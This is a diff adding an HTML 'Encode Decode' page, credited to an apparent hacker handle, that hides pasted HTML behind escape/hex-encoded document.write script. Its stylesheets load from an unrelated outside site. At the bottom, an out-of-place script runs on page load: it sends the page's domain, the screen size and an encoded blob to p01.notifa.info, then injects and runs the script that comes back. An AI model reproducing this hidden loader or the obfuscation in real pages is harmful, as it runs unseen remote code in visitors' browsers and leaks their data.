@@ -1,0 +1,161 @@
+
+<!doctype html>
+<html lang="en" class="loading">
+ <head> 
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
+  <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui"> 
+  <meta name="description" content="Encode Decode | ./Hidan X-ploit"> 
+  <meta name="keywords" content="Encode Decode | ./Hidan X-ploit"> 
+  <meta name="author" content="./Hidan X-ploit"> 
+  <title>Encode Decode || ./Lihh X-ploit</title> 
+  <script src="https://kit.fontawesome.com/e88f38b6d4.js" crossorigin="anonymous"></script> 
+  <meta name="google-site-verification" content="6K37pf5LurG3ysUq8ngmmKoNjYOYEGYo-bobscVZ-B0">  
+  <meta name="apple-mobile-web-app-capable" content="yes"> 
+  <link href="https://fonts.googleapis.com/css?family=Rubik:300,400,500,700,900|Montserrat:300,400,500,600,700,800,900" rel="stylesheet"> 
+  <link rel="stylesheet" type="text/css" href="https://agarwalsamajuttarpradesh.com/1.css"> 
+  <link rel="stylesheet" type="text/css" href="https://agarwalsamajuttarpradesh.com/css.css"> 
+  <link rel="stylesheet" type="text/css" href="https://agarwalsamajuttarpradesh.com/2.css"> 
+  <link rel="stylesheet" type="text/css" href="https://agarwalsamajuttarpradesh.com/3.css"> 
+  <link rel="stylesheet" type="text/css" href="https://agarwalsamajuttarpradesh.com/4.css"> 
+  <link rel="stylesheet" type="text/css" href="https://agarwalsamajuttarpradesh.com/5.css"> 
+  <link rel="stylesheet" type="text/css" href="https://tools.zone-xsec.com/app-assets/css/app.css"> 
+ </head> 
+ <body bgcolor="#1e1e1e"> 
+<br>
+
+   <center> 
+    <!--Panel Main---> 
+    <br>
+    <font size="70px" face="Kelly Slab"  style="text-shadow: 0px 0px 10px;" color="white">Encode Decode</font>
+    <hr>
+    <br> 
+    <link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css"> 
+    <style>body {background: #1e1e1e; color: white; font-family:Kelly Slab;} input {font-family:Kelly Slab;} .btn{background:transparent;font-family: Kelly Slab;color:#fff;border-color:#fff;cursor:pointer}.form-control{background:transparent;font-family:Kelly Slab;color:#fff;border-color:#fff;cursor:pointer;max-width:95%}font{font-family:Kelly Slab;}</style>
+    <center> 
+                  <br> 
+                  <center>
+                  <span title="slightly larger file"><input type=radio name=enctype checked onclick="fullenc=false">Normal Encrypt</span> &nbsp;&nbsp;
+                  <span title="file will be three times larger"><input type=radio name=enctype onclick="fullenc=true">Full Encrypt</span>
+                  </table>
+                  <center>
+                  <textarea  id=InputArea name=InputArea class="form-control" onchange="FileSizes()" onkeyup="FileSizes()" onmouseup="FileSizes()" placeholder="Tempelkan Code Html Lu"></textarea>
+                  <table align="center" width="95%" cellspacing="0" cellpadding="3" border="0" ><br>
+                  <tr style="font-family:arial, sans serif; font-size:14px">
+                  <td id=topSize align=center >0</td>
+                  <input class="btn" type=button value="Preview&uarr;" onclick="Preview(0)"></td><br>
+                  &uarr; Original Code<br>
+                  <input class="btn" type=button value="Encode" onclick="Encrypt()"> </td>
+                  <input class="btn" type=button value="Decode" onclick="Decrypt()"></td><br>
+                  Converted Code &darr;<br>
+                  <br>
+                  <td align=center ><input class="btn" type=button value="Preview&darr;" onclick="Preview(1)"></td>
+                  <td id=bottomSize align=center>0</td>
+                  </tr>
+                  </table>
+                  
+                  <textarea  id="OutputArea" name="OutputArea" placeholder="Hasil" class="form-control" onchange="FileSizes()" onkeyup="FileSizes()" onmouseup="FileSizes()"></textarea>
+                  </center>
+                  <center><br>
+                  <input class="btn" type="button" 
+                  onclick="document.getElementById('OutputArea').select();
+                  document.getElementById('OutputArea').focus();"
+                  value=" Select All " />
+                  </center>
+                 </fieldset>
+                </div>
+               </div>
+              </div>
+             </div>
+            </div>
+           </div>
+            </div>
+             </div>
+              </section>
+             </div>
+            </div>
+           </div>
+           <script language=javascript>
+           <!--
+           var quot="'"
+           var fullenc=false
+           
+           function Encrypt() {
+           if (fullenc) {EncryptAll()} else {EncryptBasic()}
+           }
+           
+           function EncryptBasic(){
+           var NewCode=escape(document.getElementById('InputArea').value)
+           NewCode='<'+'script language=javascript>document.write(unescape('+quot
+           + NewCode+quot+ '))<'+'/script>\n'
+           document.getElementById('OutputArea').value = NewCode
+           FileSizes()
+           }
+           
+           function EncryptAll() {NewCode=""
+           var OldCode=document.getElementById('InputArea').value
+           for (var i=0; i<OldCode.length; i++){NewCode=NewCode+Hex(OldCode.charCodeAt(i))}
+           NewCode='<'+'script language=javascript>document.write(unescape('+quot
+           + NewCode+quot+ '))<'+'/script>\n'    	
+           document.getElementById('OutputArea').value = NewCode
+           FileSizes()
+           //--adds linebreak after encoded block.
+           // the added linebreaks prevent preview in interim decoding, 
+           //  but will view in final decoding 
+           }
+           
+           function Decrypt() {
+           var NewCode=unescape(document.getElementById('InputArea').value)
+           NewCode=NewCode.replace("<script language=javascript>document.write(unescape('","")
+           //NewCode=NewCode.replace("\n'))<"+"/script>","")
+           NewCode=NewCode.replace("'))<"+"/script>","")
+           document.getElementById('OutputArea').value = NewCode
+           FileSizes()
+           }
+           
+           function Hex(dec){
+           var hexbase="0123456789ABCDEF"
+           hx_hi=dec/16; hx_lo=dec%16;
+           hx=hexbase.substr(hx_hi,1)+hexbase.substr(hx_lo,1)
+           hexval='%'+hx
+           return hexval;
+           }
+           
+           function FileSizes() {
+           document.getElementById('topSize').innerHTML= 
+           document.getElementById('InputArea').value.length
+           document.getElementById('bottomSize').innerHTML= 
+           document.getElementById('OutputArea').value.length
+           
+           }
+           
+           function Preview(selection) {
+           FileSizes()
+           var newpage=""
+           if (selection==0) {newpage=document.getElementById('InputArea').value
+           var w0 = window.open("","popup0","width=600,height=350,directories=no,menubar=yes,status=yes,toolbar=yes,resizable=yes,scrollbars=yes,screenY=0,top=0,screenX=80,left=80" );
+           w0.document.writeln("<html><title>Top Window Preview</title><body>" );
+           w0.document.writeln(newpage);
+           w0.document.writeln("<hr><form><center><input type=\"submit\" value=\"Close Window\" onClick=\"window.close();return false; \"></center></form>" );
+           w0.document.writeln("</body></html>" );
+           w0.document.close() ;
+           w0.document.focus(true)
+           }
+           else {selection=1; newpage=document.getElementById('OutputArea').value
+           var w1 = window.open("","popup1","width=600,height=350,directories=no,menubar=yes,status=yes,toolbar=yes,resizable=yes,scrollbars=yes,screenY=0,top=0,screenX=80,left=80" );
+           w1.document.writeln("<html><title>Bottom Window Preview</title><body>" );
+           w1.document.writeln(newpage);
+           w1.document.writeln("<hr><form><center><input type=\"submit\" value=\"Close Window\" onClick=\"window.close();return false; \"></center></form>" );
+           w1.document.writeln("</body></html>" );
+           w1.document.close() ;
+           w1.document.focus(true)
+           }
+           }
+           
+           -->
+           </script>
+           <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXOmjP8mP8DGQBODhnHMVUVaepa62GQOEhX53xBIvYF4afgZ6y5rseYhtWMSi0iTxZVqkJpJZ7og4uvGPyAKcgoGEAG1k%2fSDmTMky6K%2bzZsZ6KUaVYukdvW5MD2dHPY7NjP9XDyEd9lPvqQi%2fl%2fmEyBNzj745wBfbKNd6o2lGd8lDi7EUikj%2fj1o1rNhFM9cj20nAYGSPjXQCBstKV%2bsDEdAfwBh8cyLoy3vzL3FRjJ8XYkmjwzgAZMznBEmaUEiCzQBqLyEtAHHPrmCYCs47WGBtP0bobmbNgsv%2bd%2fGAaZCJWvq711qnCVSCjObzdCnL5q0IS8Q2te4rSsHYsn%2bRL5J%2bqTZyBrEUoFKw1i%2b25HHMBqlTuZHtH1A5lUiKz2CD3AqVegZXIciYuFnX8iVQ1bfRuA6FeG2W6uVyGiP5SdfLrcWADInh4UCdicuf%2bls23jY1vtIzmZ9OaZNUW4JOLMrJVaqTaDwWkbTWsiZgsuYTyRAHjYf7aGW91tbmz4JW2DbGBCRncpzUaBNMvJgjHqhJMHJiW5qVOyTFL2CqWuaUkhOH4R4G26IZLGSny5t74Dg%2bxM5t8DY4kES0jV4TfQKvUdKUrwkJcQsnBkm5ZCWOsqmkZHxoJDLzNZBSjQZ8SGB8cRQJPimo%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+  <hr>
+ <center><font color="white" size="4" face="courier new">© 2022 ‧ </font><font color="#00FFFF" size="4" face="courier new"><a href="https://www.instagram.com/yslihh">./Lihh X-ploit</font></a><font color="white" size="4" face="courier new"> .All Rights Reserved</font></center>
+ </body>
+</html>
